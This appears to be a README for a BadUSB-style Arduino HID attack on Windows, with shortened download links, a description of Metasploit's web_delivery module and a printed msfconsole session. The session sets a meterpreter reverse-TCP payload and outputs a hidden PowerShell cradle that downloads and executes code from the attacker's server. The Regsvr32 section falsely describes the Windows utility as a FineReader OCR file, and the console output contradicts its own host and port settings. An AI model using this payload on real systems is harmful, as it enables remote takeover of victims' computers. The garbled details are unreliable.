## Downloads 

These software only run on windows machine.

- Download the arduino IDE: https://goo.gl/4YgErk

- Get the drivers: https://goo.gl/r3pn1b

- Additional Board Manager URL: https://goo.gl/874mE2

- DigiKeyboard Source Code: https://goo.gl/1fkWGU

## Arduino HID

Transforming Arduino into `HID` (Human Interface Detect).

**Vídeo Youtube**

[![Everything Is AWESOME](https://i.ytimg.com/an_webp/fGmGBa-4cYQ/mqdefault_6s.webp?du=3000&sqp=CJSX2c8F&rs=AOn4CLDLtzL-sGYoW7W2G-NFuSvpvuTB_Q)](https://youtu.be/fGmGBa-4cYQ "Everything Is AWESOME")

## Exploiting windows

### Web Delivery

Metasploit’s Web Delivery Script is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine.

This exploit requires a method of executing commands on the victim machine. In particular you must be able to reach the attacking machine from the victim. Remote command execution is a great example of an attack vector where using this module is possible. The web delivery script works on php, python, and powershell based applications.

This exploit becomes a very useful tool when the attacker has some control of the system, but does not possess a full shell. In addition, since the server and payload are both on the attacking machine, the attack proceeds without being written to disk. This helps keep the attacking fingerprint low.

<a href="https://www.offensive-security.com/metasploit-unleashed/web-delivery/">Offensive Security</a>

### Regsvr32

Regsvr32.exe is an EXE file type associated with FineReader OCR, developed by Abbyy USA Software House Inc. for the Windows operating system. The most recent known version of Regsvr32.exe is 1.0.0.0, which was produced for Windows. This EXE file loads a popular 1-star rating and an "Unknown" security rating.

<a href="http://www.solvusoft.com/pt-br/files/erro-remo%C3%A7%C3%A3o-do-v%C3%ADrus/exe/windows/abbyy-usa-software-house-inc/finereader-ocr/regsvr32-exe/">Solvusoft</a>

### Commands Metasploit

The following is the <b>msfconsole</b>

<img src="http://i.imgur.com/rtqbJAH.png"></img>

<pre>
<b>msf auxiliary(gitlab_user_enum) > </b>use exploit/multi/script/web_delivery <br>
<b>msf exploit(web_delivery) > </b>set target 2 <br>
<b>target => </b>2 <br>
<b>msf exploit(web_delivery) > </b>set payload windows/meterpreter/reverse_tcp <br>
<b>payload => </b>windows/meterpreter/reverse_tcp <br>
<b>msf exploit(web_delivery) > </b>set LHOST 192.168.86.6 <br>
<b>LHOST => </b>192.168.86.6 <br>
<b>msf exploit(web_delivery) > </b>set LPORT 4444 <br>
<b>LPORT => </b>4444 <br>
<b>msf exploit(web_delivery) > </b>exploit <br>
<b>[*]</b> Exploit running as background job. <br><br>

<b>[*]</b> Started reverse TCP handler on 192.168.0.100:2333 <br>
<b>[*]</b> Using URL: http://0.0.0.0:9090/WXCOjGGir <br>
<b>msf exploit(web_delivery) </b>
<b>[*]</b> Local IP: http://192.168.0.100:9090/WXCOjGGir <br>
<b>[*]</b> Server started. <br>
<b>[*]</b> Run the following command on the target machine: <br>
powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://192.168.0.100:9090/WXCOjGGir');
</pre>
